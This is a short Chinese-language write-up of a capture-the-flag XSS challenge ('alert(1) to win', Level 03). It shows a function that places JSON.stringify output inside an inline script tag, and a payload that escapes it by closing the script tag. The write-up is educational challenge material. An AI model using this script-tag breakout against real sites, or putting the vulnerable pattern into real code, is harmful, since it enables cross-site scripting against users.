## [[alert(1) to win](https://alf.nu/alert1)] [[Level 03 - JSON](https://alf.nu/alert1)] [[解题报告](https://exp-blog.com/safe/ctf/alert/level-03-json/)]

------

## 题目

```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

------

## 解题报告

从代码可知对输入做了 `stringify` 过滤，关于其功能详见 [这里](https://www.runoob.com/js/javascript-json-stringify.html) 

简单来说就是把 `"` 和 `\` 都转义了，导致无法直接闭合函数。

但是闭合 `<script>` 就可以了，构造 payload 如下 （此处没有闭合后半段的双引号，而是通过行注释 `//` 屏蔽掉）：

```javascript
</script><script>alert(1);//
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/alert/Level%2003%20-%20JSON/imgs/01.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
